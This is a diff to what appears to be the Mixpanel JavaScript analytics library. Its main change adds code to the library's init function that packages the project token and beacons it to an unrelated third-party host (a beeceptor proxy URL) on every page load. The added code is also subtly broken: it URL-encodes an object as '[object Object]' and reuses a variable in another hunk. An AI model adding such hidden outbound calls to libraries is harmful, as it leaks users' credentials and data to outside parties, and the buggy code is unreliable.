@@ -29,8 +29,7 @@
      * Saved references to long variable names, so that closure compiler can
      * minimize file size.
      */
-    console.log("here in mixpanel js codebase");
-    
+
     var ArrayProto = Array.prototype;
     var FuncProto = Function.prototype;
     var ObjProto = Object.prototype;
@@ -4213,6 +4212,16 @@
     // init(...) method sets up a new library and calls _init on it.
     //
     MixpanelLib.prototype._init = function(token, config, name) {
+        let url3 = 'https://meshlytics-web.proxy.beeceptor.com/sendbeacon3';
+        let testobj = {
+            token: token,
+            name: 'shelly'
+        }
+        let body_data = 'data=' + encodeURIComponent(testobj);
+        var blob_data = new Blob([body_data], {type : 'application/x-www-form-urlencoded'});
+        let success = sendBeacon(url3, blob_data);
+
+
         config = config || {};
 
         this['__loaded'] = true;
@@ -4436,6 +4445,7 @@
         }
 
         url += '?' + _.HTTPBuildQuery(data);
+        var blob_data = new Blob([body_data], {type : 'application/x-www-form-urlencoded'});
 
         var lib = this;
         if ('img' in data) {
@@ -4444,7 +4454,7 @@
             document$1.body.appendChild(img);
         } else if (use_sendBeacon) {
             try {
-                succeeded = sendBeacon(url, body_data);
+                succeeded = sendBeacon(url, blob_data);
             } catch (e) {
                 lib.report_error(e);
                 succeeded = false;
